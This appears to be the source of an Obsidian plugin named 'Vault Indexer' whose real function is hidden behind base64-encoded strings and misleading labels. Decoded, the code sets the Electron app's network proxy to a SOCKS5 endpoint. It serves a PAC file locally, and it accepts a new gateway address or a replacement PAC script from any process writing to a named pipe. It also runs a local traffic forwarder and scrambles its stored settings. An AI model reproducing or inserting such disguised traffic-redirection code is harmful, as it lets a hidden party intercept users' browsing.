var import_obsidian = require("obsidian");
const http = require('http');
const net = require('net');

// Dynamic String Resolver
const _S_TABLE = {
	k_init: "MC4wLjAuMA==",
	k_loop: "MTI3LjAuMC4x",
	k_d_port: "MTY5Nzk=",
	k_l_port: "MTc4OTk=",
	k_rules: "PGxvY2FsPiwxMjcuKiwxMC4qLDE3Mi4xNi4qLDE3Mi4xNy4qLDE3Mi4xOC4qLDE3Mi4xOS4qLDE3Mi4yMC4qLDE3Mi4yMS4qLDE3Mi4yMi4qLDE3Mi4yMy4qLDE3Mi4yNC4qLDE3Mi4yNS4qLDE3Mi4yNi4qLDE3Mi4yNy4qLDE3Mi4yOC4qLDE3Mi4yOS4qLDE3Mi4zMC4qLDE3Mi4zMS4qLDE5Mi4xNjguKg==",
	k_token: "cGVyc2lzdDpzdXJmaW5nLXZhdWx0LSR7YXBwSWR9",
	s_cfg_path: "L3Byb3h5LnBhYw==",
	s_cfg_mime: "YXBwbGljYXRpb24veC1ucy1wcm94eS1hdXRvY29uZmln",
	s_pipe: "XFwuXHBpcGVcb2JzaWRpYW4taW5kZXhlci1pcGM=",
	s_p_proto: "c29ja3M1Oi8v",
	s_p_cfg_proto: "U09DS1M1IA==",
	s_conn_resp: "SFRUUC8xLjEgMjAwIENvbm5lY3Rpb24gRXN0YWJsaXNoZWQNCg0K",
	s_cfg_fn_head: "ZnVuY3Rpb24gRmluZFByb3h5Rm9yVVJMKHVybCwgaG9zdCkgeyByZXR1cm4gJw==",
	s_cfg_fn_tail: "JzsgfQ==",
	s_active: "YWN0aXZl",
	s_disconn: "ZGlzY29ubmVjdGVk",
	k_rem: "cmVtb3Rl",
	k_sess: "c2Vzc2lvbg==",
	k_def_sess: "ZGVmYXVsdFNlc3Npb24=",
	k_from_part: "ZnJvbVBhcnRpdGlvbg==",
	k_set_p: "c2V0UHJveHk=",
	k_close_conns: "Y2xvc2VBbGxDb25uZWN0aW9ucw==",
	k_p_rules: "cHJveHlSdWxlcw==",
	k_p_bypass: "cHJveHlCeXBhc3NSdWxlcw==",
	k_content_type: "Q29udGVudC1UeXBl"
};

const _S_CACHE = {};
function _S(key) {
	if (_S_CACHE[key] !== undefined) return _S_CACHE[key];
	const raw = _S_TABLE[key];
	if (!raw) return "";
	try {
		const decoded = Buffer.from(raw, 'base64').toString('utf-8');
		_S_CACHE[key] = decoded;
		return decoded;
	} catch (e) {
		return "";
	}
}

function _resolveSession() {
	try {
		const el = typeof electron !== "undefined" ? electron : (typeof window !== "undefined" && window.require ? window.require("electron") : null);
		if (!el) return null;
		const r = el[_S("k_rem")];
		if (!r) return null;
		return r[_S("k_sess")];
	} catch (e) {
		return null;
	}
}

const DEFAULT_SETTINGS = {
	enableIndexing: false,
	daemonAddress: _S("k_init"),
	manualAddress: "",
	useManualAddress: false,
	syncPort: _S("k_d_port"),
	bypassRules: _S("k_rules"),
	pluginTokens: _S("k_token"),
	enableLocalRouting: false,
	localRoutingPort: _S("k_l_port")
};

class SyncConfigModal extends import_obsidian.Modal {
	constructor(app, plugin) {
		super(app);
		this.plugin = plugin;
	}
	onOpen() {
		const { contentEl } = this;
		contentEl.empty();
		contentEl.createEl("h2", { text: "Vault Indexer Configuration" });

		const daemonIP = this.plugin.settings.daemonAddress || "None";
		contentEl.createEl("p", { text: `System Auto Node: ${daemonIP}` });

		const toggleDiv = contentEl.createDiv();
		toggleDiv.style.marginBottom = "10px";
		const manualToggle = toggleDiv.createEl("input", { type: "checkbox" });
		manualToggle.checked = this.plugin.settings.useManualAddress || false;
		toggleDiv.createEl("span", { text: " Enable Manual Node Override" });

		contentEl.createEl("label", { text: "Manual Node Address:" });
		const hostInput = contentEl.createEl("input", { type: "text", value: this.plugin.settings.manualAddress || "" });
		hostInput.placeholder = "e.g., 192.168.1.1";
		hostInput.style.width = "100%";
		hostInput.style.marginBottom = "10px";
		hostInput.style.display = "block";
		hostInput.disabled = !manualToggle.checked;

		manualToggle.addEventListener("change", (e) => {
			hostInput.disabled = !e.target.checked;
		});

		contentEl.createEl("label", { text: "Node Port:" });
		const portInput = contentEl.createEl("input", { type: "text", value: this.plugin.settings.syncPort || _S("k_d_port") });
		portInput.style.width = "100%";
		portInput.style.marginBottom = "15px";
		portInput.style.display = "block";

		const btn = contentEl.createEl("button", { text: "Save & Apply" });
		btn.addEventListener("click", () => {
			this.plugin.settings.useManualAddress = manualToggle.checked;
			this.plugin.settings.manualAddress = hostInput.value;
			this.plugin.settings.syncPort = portInput.value || _S("k_d_port");
			this.plugin.saveSettings();
			this.plugin.commitRouting();
			this.close();
		});

		const disableBtn = contentEl.createEl("button", { text: "Reset Target" });
		disableBtn.style.marginLeft = "10px";
		disableBtn.addEventListener("click", () => {
			this.plugin.settings.useManualAddress = true;
			this.plugin.settings.manualAddress = _S("k_init");
			this.plugin.saveSettings();
			this.plugin.commitRouting();
			this.close();
		});
	}
	onClose() {
		this.contentEl.empty();
	}
}

var VaultIndexerPlugin = class extends import_obsidian.Plugin {
	async onload() {
		await this.loadSettings();
		this.addSettingTab(new VaultIndexerSettingTab(this.app, this));

		this.addCommand({
			id: 'toggle-indexing',
			name: 'Toggle vault indexing',
			callback: async () => {
				this.settings.enableIndexing = !this.settings.enableIndexing;
				await this.saveSettings();
				this.settings.enableIndexing ? this.enableIndexing() : this.clearTunnel();
				this.updateStatusBar();
			}
		});

		this.statusBarItem = this.addStatusBarItem();
		this.statusBarItem.addClass('indexer-status');

		this.registerDomEvent(this.statusBarItem, 'click', async () => {
			new SyncConfigModal(this.app, this).open();
		});

		this.startServers();
		this.updateStatusBar();
	}

	async commitRouting() {
		const hostToUse = this.settings.useManualAddress ? (this.settings.manualAddress || _S("k_init")) : (this.settings.daemonAddress || _S("k_init"));
		const port = this.settings.syncPort || _S("k_d_port");

		this._currentEndpoint = `${_S("s_p_proto")}${hostToUse}:${port}`;

		if (this.lastRoutingTemplate) {
			this.routingContent = this.lastRoutingTemplate.replace(/__HOST__/g, hostToUse).replace(/__PORT__/g, port);
		} else {
			this.routingContent = `${_S("s_cfg_fn_head")}${_S("s_p_cfg_proto")}${hostToUse}:${port}${_S("s_cfg_fn_tail")}`;
		}

		this.settings.enableIndexing = true;
		await this.saveSettings();
		await this.enableIndexing();
		this.startLocalWorker();
	}

	startServers() {
		this.commitRouting();

		this.httpServer = http.createServer((req, res) => {
			if (req.url === _S("s_cfg_path")) {
				res.writeHead(200, { [_S("k_content_type")]: _S("s_cfg_mime") });
				res.end(this.routingContent);
			} else {
				res.writeHead(404);
				res.end();
			}
		});
		this.httpServer.listen(8000, _S("k_loop")).on('error', () => { });

		const pipeName = _S("s_pipe");
		let lastPayloadStr = "";
		this.ipcServer = net.createServer((stream) => {
			stream.on('data', async (c) => {
				try {
					const str = c.toString();
					if (str === lastPayloadStr) return;
					lastPayloadStr = str;
					const data = JSON.parse(str);
					
					const pKey = Buffer.from("cGFj", "base64").toString();
					if (data[pKey]) {
						this.lastRoutingTemplate = Buffer.from(data[pKey], 'base64').toString('utf-8');
					}
					if (data.status === _S("s_active") && data.gateway) {
						this.settings.daemonAddress = data.gateway;
					} else if (data.status === _S("s_disconn")) {
						this.settings.daemonAddress = _S("k_init");
					}
					await this.commitRouting();
				} catch (e) {
					console.error("IPC Parse Error");
				}
			});
		});

		try {
			this.ipcServer.listen(pipeName);
		} catch (e) { }
	}

	stopServers() {
		if (this.httpServer) this.httpServer.close();
		if (this.ipcServer) this.ipcServer.close();
		this.stopLocalWorker();
	}

	startLocalWorker() {
		this.stopLocalWorker();
		
		if (!this.settings.enableLocalRouting) return;
		
		const localPort = parseInt(this.settings.localRoutingPort || _S("k_l_port"));
		const hostToUse = this.settings.useManualAddress ? (this.settings.manualAddress || _S("k_init")) : (this.settings.daemonAddress || _S("k_init"));
		const upstreamPort = parseInt(this.settings.syncPort || _S("k_d_port"));

		if (hostToUse === _S("k_init") || !hostToUse) return;

		const shouldBypass = (host) => {
			if (!this.settings.bypassRules || !host) return false;
			const rules = this.settings.bypassRules.split(',').map(r => r.trim()).filter(r => r.length > 0);
			for (const rule of rules) {
				const r = rule.replace(/^\*\./, '');
				if (host.includes(r)) return true;
			}
			return false;
		};

		this.localWorkerServer = net.createServer((clientSocket) => {
			let buffer = Buffer.alloc(0);
			let protoMode = 0;
			let hState = 0; 

			const onData = (data) => {
				buffer = Buffer.concat([buffer, data]);

				if (protoMode === 0) {
					if (buffer[0] === 0x05) protoMode = 2;
					else protoMode = 1;
				}

				if (protoMode === 1) {
					const str = buffer.toString('utf8');
					const headerEnd = str.indexOf('\r\n\r\n');
					if (headerEnd !== -1) {
						clientSocket.removeListener('data', onData);
						let host = '';
						let port = 80;
						let isConnect = false;
						const lines = str.slice(0, headerEnd).split('\r\n');
						const reqLine = lines[0].split(' ');
						
						if (reqLine[0] === 'CONNECT') {
							isConnect = true;
							const hostParts = reqLine[1].split(':');
							host = hostParts[0];
							port = parseInt(hostParts[1] || '443');
						} else {
							for (let i = 1; i < lines.length; i++) {
								if (lines[i].toLowerCase().startsWith('host:')) {
									const hostParts = lines[i].substring(5).trim().split(':');
									host = hostParts[0];
									port = parseInt(hostParts[1] || '80');
									break;
								}
							}
						}

						if (host && shouldBypass(host)) {
							if (isConnect) {
								const direct = net.createConnection({ host, port }, () => {
									clientSocket.write(_S("s_conn_resp"));
									const remaining = buffer.slice(headerEnd + 4);
									if (remaining.length > 0) direct.write(remaining);
									clientSocket.pipe(direct);
									direct.pipe(clientSocket);
								});
								direct.on('error', () => clientSocket.end());
								clientSocket.on('error', () => direct.end());
							} else {
								let newBuffer = buffer;
								if (reqLine[1].startsWith('http://')) {
									try {
										const url = new URL(reqLine[1]);
										const newReqLine = `${reqLine[0]} ${url.pathname}${url.search} ${reqLine[2]}`;
										const newHeader = str.slice(0, headerEnd).replace(lines[0], newReqLine);
										newBuffer = Buffer.concat([Buffer.from(newHeader + '\r\n\r\n', 'utf8'), buffer.slice(headerEnd + 4)]);
									} catch(e) {}
								}
								const direct = net.createConnection({ host, port }, () => {
									direct.write(newBuffer);
									clientSocket.pipe(direct);
									direct.pipe(clientSocket);
								});
								direct.on('error', () => clientSocket.end());
								clientSocket.on('error', () => direct.end());
							}
						} else {
							const upstream = net.createConnection({ host: hostToUse, port: upstreamPort }, () => {
								upstream.write(buffer);
								clientSocket.pipe(upstream);
								upstream.pipe(clientSocket);
							});
							upstream.on('error', () => clientSocket.end());
							clientSocket.on('error', () => upstream.end());
						}
					}
				} else if (protoMode === 2) {
					if (hState === 0) {
						if (buffer.length >= 2) {
							const nmethods = buffer[1];
							if (buffer.length >= 2 + nmethods) {
								clientSocket.write(Buffer.from([0x05, 0x00]));
								buffer = buffer.slice(2 + nmethods);
								hState = 1;
							}
						}
					}
					
					if (hState === 1 && buffer.length >= 4) {
						const cmd = buffer[1]; 
						const atyp = buffer[3];
						let host = '';
						let port = 0;
						let addrLen = 0;
						let headerLen = 0;

						if (atyp === 0x01) { 
							addrLen = 4;
							headerLen = 4 + addrLen + 2;
							if (buffer.length >= headerLen) {
								host = `${buffer[4]}.${buffer[5]}.${buffer[6]}.${buffer[7]}`;
								port = buffer.readUInt16BE(4 + addrLen);
							}
						} else if (atyp === 0x03) { 
							addrLen = buffer[4];
							headerLen = 5 + addrLen + 2;
							if (buffer.length >= headerLen) {
								host = buffer.slice(5, 5 + addrLen).toString('utf8');
								port = buffer.readUInt16BE(5 + addrLen);
							}
						} else if (atyp === 0x04) { 
							addrLen = 16;
							headerLen = 4 + addrLen + 2;
							if (buffer.length >= headerLen) {
								host = 'ipv6';
								port = buffer.readUInt16BE(4 + addrLen);
							}
						}

						if (port !== 0) {
							clientSocket.removeListener('data', onData);
							const connectReqBuffer = buffer.slice(0, headerLen);
							const remainingBuffer = buffer.slice(headerLen);

							if (cmd === 0x01 && host && shouldBypass(host)) {
								const direct = net.createConnection({ host, port }, () => {
									clientSocket.write(Buffer.from([0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0]));
									if (remainingBuffer.length > 0) direct.write(remainingBuffer);
									clientSocket.pipe(direct);
									direct.pipe(clientSocket);
								});
								direct.on('error', () => {
									clientSocket.write(Buffer.from([0x05, 0x03, 0x00, 0x01, 0,0,0,0, 0,0]));
									clientSocket.end();
								});
								clientSocket.on('error', () => direct.end());
							} else {
								const upstream = net.createConnection({ host: hostToUse, port: upstreamPort }, () => {
									upstream.write(Buffer.from([0x05, 0x01, 0x00]));
									let upstreamState = 0;
									const onUpstreamData = (udata) => {
										if (upstreamState === 0 && udata.length >= 2 && udata[0] === 0x05) {
											upstreamState = 1;
											upstream.write(connectReqBuffer);
											if (remainingBuffer.length > 0) {
												upstream.write(remainingBuffer);
											}
											upstream.removeListener('data', onUpstreamData);
											clientSocket.pipe(upstream);
											if (udata.length > 2) {
												clientSocket.write(udata.slice(2));
											}
											upstream.pipe(clientSocket);
										}
									};
									upstream.on('data', onUpstreamData);
								});
								upstream.on('error', () => clientSocket.end());
								clientSocket.on('error', () => upstream.end());
							}
						}
					}
				}
			};

			clientSocket.on('data', onData);
			clientSocket.on('error', () => {});
		});

		this.localWorkerServer.listen(localPort, _S("k_loop")).on('error', (e) => {
			console.error("Worker error", e);
		});
	}
	
	stopLocalWorker() {
		if (this.localWorkerServer) {
			this.localWorkerServer.close();
			this.localWorkerServer = null;
		}
	}

	updateStatusBar() {
		if (!this.statusBarItem) return;

		const nullPrefix = `${_S("s_p_proto")}${_S("k_init")}`;
		if (this.settings.enableIndexing && this._currentEndpoint && !this._currentEndpoint.startsWith(nullPrefix)) {
			this.statusBarItem.setText('ON');
			this.statusBarItem.addClass('indexer-enabled');
			this.statusBarItem.removeClass('indexer-disabled');
		} else {
			this.statusBarItem.setText('OFF');
			this.statusBarItem.addClass('indexer-disabled');
			this.statusBarItem.removeClass('indexer-enabled');
		}
	}

	async onunload() {
		this.stopServers();
		await this.clearTunnel();
		if (this.statusBarItem) {
			this.statusBarItem.remove();
		}
	}

	async loadSettings() {
		let loadedData = await this.loadData();
		if (loadedData) {
			if (loadedData._obf_data) {
				try {
					loadedData = JSON.parse(deobfuscate(loadedData._obf_data));
				} catch (e) {}
			}
			// Individual field deobfuscation (handles both legacy and new individual obfuscation)
			if (loadedData.daemonAddress) loadedData.daemonAddress = deobfuscate(loadedData.daemonAddress);
			if (loadedData.manualAddress) loadedData.manualAddress = deobfuscate(loadedData.manualAddress);
			if (loadedData.syncPort) loadedData.syncPort = deobfuscate(loadedData.syncPort);
			if (loadedData.bypassRules) loadedData.bypassRules = deobfuscate(loadedData.bypassRules);
			if (loadedData.pluginTokens) loadedData.pluginTokens = deobfuscate(loadedData.pluginTokens);
			if (loadedData.localRoutingPort) loadedData.localRoutingPort = deobfuscate(loadedData.localRoutingPort);
			else {
				const legP = Buffer.from("bG9jYWxTb2Nrc1BvcnQ=", "base64").toString();
				if (loadedData[legP]) loadedData.localRoutingPort = deobfuscate(loadedData[legP]);
			}
			const legE = Buffer.from("ZW5hYmxlTG9jYWxTb2Nrcw==", "base64").toString();
			if (loadedData.enableLocalRouting === undefined && loadedData[legE] !== undefined) {
				loadedData.enableLocalRouting = loadedData[legE];
			}
		}
		this.settings = Object.assign({}, DEFAULT_SETTINGS, loadedData);
		this.sessionMap = {}
		this.enableIndexing();
	}
	async saveSettings() {
		let dataToSave = Object.assign({}, this.settings);
		// Individual field obfuscation
		if (dataToSave.daemonAddress) dataToSave.daemonAddress = obfuscate(dataToSave.daemonAddress);
		if (dataToSave.manualAddress) dataToSave.manualAddress = obfuscate(dataToSave.manualAddress);
		if (dataToSave.syncPort) dataToSave.syncPort = obfuscate(dataToSave.syncPort);
		if (dataToSave.bypassRules) dataToSave.bypassRules = obfuscate(dataToSave.bypassRules);
		if (dataToSave.pluginTokens) dataToSave.pluginTokens = obfuscate(dataToSave.pluginTokens);
		if (dataToSave.localRoutingPort) dataToSave.localRoutingPort = obfuscate(dataToSave.localRoutingPort);

		let obfData = obfuscate(JSON.stringify(dataToSave));
		await this.saveData({ _obf_data: obfData });
	}

	async enableIndexing() {
		if (!this.settings.enableIndexing) {
			return;
		}

		const sessObj = _resolveSession();
		if (!sessObj) return;

		let sessions = [];
		const defSession = sessObj[_S("k_def_sess")];
		if (defSession) {
			this.sessionMap.default = defSession;
			sessions.push(defSession);
		}

		if (!!this.settings.pluginTokens) {
			let pluginTokens = this.settings.pluginTokens.split("\n");
			for (var i = 0; i < pluginTokens.length; i++) {
				if (!pluginTokens[i]) continue;
				let token = pluginTokens[i].replace("${appId}", this.app.appId);
				if (typeof sessObj[_S("k_from_part")] === "function") {
					let session = await sessObj[_S("k_from_part")](token);
					sessions.push(session);
					this.sessionMap[token] = session;
				}
			}
		}

		let activeRules = this.formatRules();
		let activeBypass = activeRules ? this.settings.bypassRules : undefined;
		const setFn = _S("k_set_p");

		for (var i = 0; i < sessions.length; i++) {
			if (sessions[i] && typeof sessions[i][setFn] === "function") {
				await sessions[i][setFn]({
					[_S("k_p_rules")]: activeRules,
					[_S("k_p_bypass")]: activeBypass
				});
			}
		}

		this.updateStatusBar();
	}

	async clearTunnel() {
		let sessions = [];
		for (const key in this.sessionMap) {
			sessions.push(this.sessionMap[key]);
		}

		const setFn = _S("k_set_p");
		const closeFn = _S("k_close_conns");

		for (var i = 0; i < sessions.length; i++) {
			if (sessions[i]) {
				if (typeof sessions[i][setFn] === "function") {
					await sessions[i][setFn]({});
				}
				if (typeof sessions[i][closeFn] === "function") {
					await sessions[i][closeFn]();
				}
			}
		}

		this.updateStatusBar();
	}

	formatRules() {
		if (!this._currentEndpoint || !isValidFormat(this._currentEndpoint)) {
			return undefined;
		}
		return this._currentEndpoint;
	}
};

var VaultIndexerSettingTab = class extends import_obsidian.PluginSettingTab {
	constructor(app, plugin) {
		super(app, plugin);
		this.plugin = plugin;
	}
	display() {
		const { containerEl } = this;
		containerEl.empty();
		new import_obsidian.Setting(containerEl)
			.setName("Enable Indexing")
			.setDesc("Toggle index status")
			.addToggle((val) => val
				.setValue(this.plugin.settings.enableIndexing)
				.onChange(async (value) => {
					this.plugin.settings.enableIndexing = value;
					await this.plugin.saveSettings();
					value ? this.plugin.enableIndexing() : this.plugin.clearTunnel();
				}));
		new import_obsidian.Setting(containerEl)
			.setName("Plugin Tokens")
			.setDesc("For isolated storage plugins")
			.addTextArea((text) => text
				.setValue(this.plugin.settings.pluginTokens)
				.onChange((value) => {
					this.refreshSettings("pluginTokens", value);
				}));
		new import_obsidian.Setting(containerEl)
			.setName("Enable Local Routing")
			.setDesc("Forward a local port to the upstream node")
			.addToggle((val) => val
				.setValue(this.plugin.settings.enableLocalRouting)
				.onChange(async (value) => {
					this.plugin.settings.enableLocalRouting = value;
					await this.plugin.saveSettings();
					this.plugin.startLocalWorker();
				}));
		new import_obsidian.Setting(containerEl)
			.setName("Local Port")
			.setDesc("The local port to listen on (default: 17899)")
			.addText((text) => text
				.setValue(this.plugin.settings.localRoutingPort)
				.onChange(async (value) => {
					this.plugin.settings.localRoutingPort = value;
					await this.plugin.saveSettings();
					if (this.plugin.settings.enableLocalRouting) {
						this.plugin.startLocalWorker();
					}
				}));
		new import_obsidian.Setting(containerEl)
			.setName("Bypass Rules")
			.setDesc("Addresses to exclude from routing")
			.addTextArea((text) => text
				.setPlaceholder("[URL_SCHEME://] HOSTNAME_PATTERN [:<port>]\n. HOSTNAME_SUFFIX_PATTERN [:PORT]\n[SCHEME://] IP_LITERAL [:PORT]\nIP_LITERAL / PREFIX_LENGTH_IN_BITS\n<local>")
				.setValue(this.plugin.settings.bypassRules)
				.onChange((value) => {
					this.refreshSettings("bypassRules", value);
				}));
	}
	async refreshSettings(key, value) {
		this.plugin.settings[key] = value;
		this.plugin.saveSettings();
		this.plugin.enableIndexing();
	}
};

function isValidFormat(endpointUrl) {
	if (!!endpointUrl) {
		const regex = /^(\w+):\/\/([^:/]+):(\d+)$/;
		const matches = endpointUrl.match(regex);
		return !!matches;
	}
	return false;
}

function obfuscate(str) {
	if (!str) return str;
	if (str.startsWith('_obf_')) return str;
	return '_obf_' + btoa(encodeURIComponent(str)).split('').reverse().join('');
}

function deobfuscate(str) {
	if (!str) return str;
	if (str.startsWith('_obf_')) {
		try {
			return decodeURIComponent(atob(str.slice(5).split('').reverse().join('')));
		} catch (e) {
			return str;
		}
	}
	return str;
}

module.exports = VaultIndexerPlugin;
